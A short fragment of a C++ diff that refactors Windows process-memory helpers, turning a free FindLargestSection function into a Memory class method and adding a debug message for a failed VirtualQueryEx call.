+            DEBUG_PRINT_ERROR_MESSAGE(TEXT("VirtualQueryEx failed\n"), hOutFile);
             break;  // VirtualQueryEx failed
         }
     }
@@ -631,7 +447,7 @@ BOOL FindPattern(HANDLE hProcess, const BYTE* pattern, size_t patternSize, uintp
     return FALSE;
 }
 
-BOOL FindLargestSection(HANDLE hProcess, uintptr_t moduleAddr, uintptr_t& resultAddress) {
+BOOL Memory::FindLargestSection(uintptr_t moduleAddr, uintptr_t& resultAddress) {
 
     MEMORY_BASIC_INFORMATION memoryInfo;
     uintptr_t offset = moduleAddr;
